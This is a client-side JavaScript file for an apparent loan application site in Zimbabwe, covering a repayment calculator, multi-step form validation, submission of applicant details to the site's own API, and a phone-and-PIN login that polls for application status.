up
const state = {
  loanAmount: 100000,
  loanTerm: "12 months"
};

const $ = id => document.getElementById(id);

function showScreen(id) {
  document.querySelectorAll(".screen").forEach(screen => {
    screen.classList.remove("active");
  });

  const screen = $(id);

  if (screen) {
    screen.classList.add("active");
    window.scrollTo({ top: 0, behavior: "smooth" });
  }
}

function toast(message) {
  const el = $("toast");

  if (!el) {
    alert(message);
    return;
  }

  el.textContent = message;
  el.classList.add("show");

  clearTimeout(window.toastTimer);
  window.toastTimer = setTimeout(() => {
    el.classList.remove("show");
  }, 3500);
}

function formatMoney(value) {
  return Number(value || 0).toLocaleString("en-US");
}

function updateCalculator() {
  const amountEl = $("amount");
  const termEl = $("term");

  if (!amountEl || !termEl) return;

  const amount = Number(amountEl.value);
  const months = Number(termEl.value);

  state.loanAmount = amount;
  state.loanTerm = `${months} months`;

  if ($("amountDisplay")) {
    $("amountDisplay").textContent =
      `USD ${formatMoney(amount)}`;
  }

  if ($("termDisplay")) {
    $("termDisplay").textContent = `${months} months`;
  }

  const monthlyRate = 0.08 / 12;
  let payment = amount / months;

  if (monthlyRate !== 0 && months > 0) {
    payment =
      amount *
      (monthlyRate * Math.pow(1 + monthlyRate, months)) /
      (Math.pow(1 + monthlyRate, months) - 1);
  }

  if ($("payment")) {
    $("payment").textContent =
      `USD ${formatMoney(Math.round(payment))}`;
  }
}

function startApplication() {
  if (!$("amount") || !$("formAmount")) {
    toast("The application form could not be loaded.");
    return;
  }

  $("formAmount").value = $("amount").value;

  const months = $("term").value;
  const termSelect = $("loanTerm");

  if (termSelect) {
    const matching = Array.from(termSelect.options).find(
      option => option.value === `${months} months`
    );

    if (matching) {
      termSelect.value = matching.value;
    }
  }

  showScreen("step1");
}

function validateStep1() {
  const loanType = $("loanType").value;
  const amount = Number($("formAmount").value);
  const term = $("loanTerm").value;
  const purpose = $("purpose").value.trim();

  if (!loanType) {
    toast("Please select a loan type.");
    return false;
  }

  if (!Number.isFinite(amount) || amount <= 0 || amount > 500000) {
    toast("Please enter a valid loan amount.");
    return false;
  }

  if (!term) {
    toast("Please select a loan term.");
    return false;
  }

  if (!purpose) {
    toast("Please enter the purpose of your loan.");
    return false;
  }

  return true;
}

function validateStep2() {
  const firstName = $("firstName").value.trim();
  const lastName = $("lastName").value.trim();
  const email = $("email").value.trim();
  const phone = $("phone").value.trim();

  if (!firstName || !lastName) {
    toast("Please enter your first and last name.");
    return false;
  }

  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    toast("Please enter a valid email address.");
    return false;
  }

  if (!/^(\+263|263|0|7)\d+$/.test(phone.replace(/[\s()-]/g, ""))) {
    toast("Please enter a valid Zimbabwe phone number.");
    return false;
  }

  return true;
}

function nextStep(step) {
  if (step === 2 && !validateStep1()) return;

  if (step === 3) {
    if (!validateStep2()) return;
    updateSummary();
  }

  showScreen(`step${step}`);
}

function updateSummary() {
  if ($("summaryType")) {
    $("summaryType").textContent = $("loanType").value;
  }

  if ($("summaryAmount")) {
    $("summaryAmount").textContent =
      `USD ${formatMoney($("formAmount").value)}`;
  }

  if ($("summaryTerm")) {
    $("summaryTerm").textContent = $("loanTerm").value;
  }

  if ($("summaryApplicant")) {
    $("summaryApplicant").textContent =
      `${$("firstName").value.trim()} ${$("lastName").value.trim()}`;
  }
}

function normalizePhone(phone) {
  const value = String(phone || "").replace(/[\s()-]/g, "");

  if (/^07\d{8}$/.test(value)) return "+263" + value.slice(1);
  if (/^7\d{8}$/.test(value)) return "+263" + value;
  if (/^\+2637\d{8}$/.test(value)) return value;
  if (/^2637\d{8}$/.test(value)) return "+" + value;

  return null;
}

async function submitApplication() {
  if (!validateStep1() || !validateStep2()) return;

  const employmentStatus = $("employmentStatus").value;
  const annualIncome = Number($("annualIncome").value);

  if (!employmentStatus) {
    toast("Please select your employment status.");
    return;
  }

  if (!Number.isFinite(annualIncome) || annualIncome <= 0) {
    toast("Please enter your annual income.");
    return;
  }

  const phone = normalizePhone($("phone").value);

  if (!phone) {
    toast("Please enter a valid Zimbabwe phone number.");
    return;
  }

  const button = $("submitBtn");

  if (!button) {
    toast("The submit button could not be found.");
    return;
  }

  button.disabled = true;
  button.textContent = "SUBMITTING...";

  const payload = {
    loanType: $("loanType").value,
    loanAmount: Number($("formAmount").value),
    loanTerm: $("loanTerm").value,
    purpose: $("purpose").value.trim(),
    firstName: $("firstName").value.trim(),
    lastName: $("lastName").value.trim(),
    email: $("email").value.trim(),
    phone,
    employmentStatus,
    annualIncome
  };

  try {
    const response = await fetch("/api/applications", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    const data = await response.json().catch(() => ({}));

    if (!response.ok) {
      throw new Error(
        data.error || "Could not submit the application."
      );
    }

    if (data.id) {
      localStorage.setItem("lastApplicationId", data.id);
    }

    showScreen("success");
  } catch (error) {
    toast(error.message || "Could not submit the application.");
  } finally {
    button.disabled = false;
    button.textContent = "SUBMIT APPLICATION";
  }
}


async function login() {
  const phone = normalizePhone($("loginPhone").value);
  const pin = $("loginPin").value.trim();
  const message = $("loginMessage");
  const button = document.querySelector(
    '#login button[onclick="login()"]'
  );

  message.textContent = "";

  if (!phone) {
    message.textContent = "Enter a valid Zimbabwe phone number.";
    return;
  }

  if (!/^\d{4}$/.test(pin)) {
    message.textContent = "Enter your 4-digit PIN.";
    return;
  }

  button.disabled = true;
  button.textContent = "CHECKING...";

  try {
    const response = await fetch("/api/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone, pin })
    });

    const data = await response.json().catch(() => ({}));

    if (!response.ok) {
      throw new Error(data.error || "Login failed.");
    }

    if (data.status === "rejected") {
      message.style.color = "#c83737";
      message.textContent =
        data.message || "Your application was not approved. Please contact support.";
      return;
    }

    if (data.status === "pending" && data.applicationId) {
      message.style.color = "#0753a6";
      message.textContent =
        "⏳ Please wait. Our support team is reviewing your application...";

      const applicationId = data.applicationId;

      for (let attempt = 0; attempt < 120; attempt++) {
        await new Promise(resolve => setTimeout(resolve, 5000));

        const statusResponse = await fetch(
          "/api/applications/" + encodeURIComponent(applicationId) + "/status"
        );

        if (!statusResponse.ok) continue;

        const statusData = await statusResponse.json();

        if (statusData.status === "approved") {
          message.textContent =
            "✅ Your application has been approved.";
          return;
        }

        if (statusData.status === "rejected") {
          message.style.color = "#c83737";
          message.textContent =
            "Your application was not approved. Please contact support.";
          return;
        }
      }

      message.textContent =
        "Your application is still awaiting review. Please try again later.";
      return;
    }

    message.style.color = "#13834b";
    message.textContent = data.message || "Login successful.";
  } catch (error) {
    message.style.color = "#c83737";
    message.textContent = error.message || "Login failed.";
  } finally {
    button.disabled = false;
    button.textContent = "LOGIN";
  }
}


document.addEventListener("DOMContentLoaded", () => {
  if ($("amount")) {
    $("amount").addEventListener("input", updateCalculator);
  }

  if ($("term")) {
    $("term").addEventListener("input", updateCalculator);
  }

  updateCalculator();
});
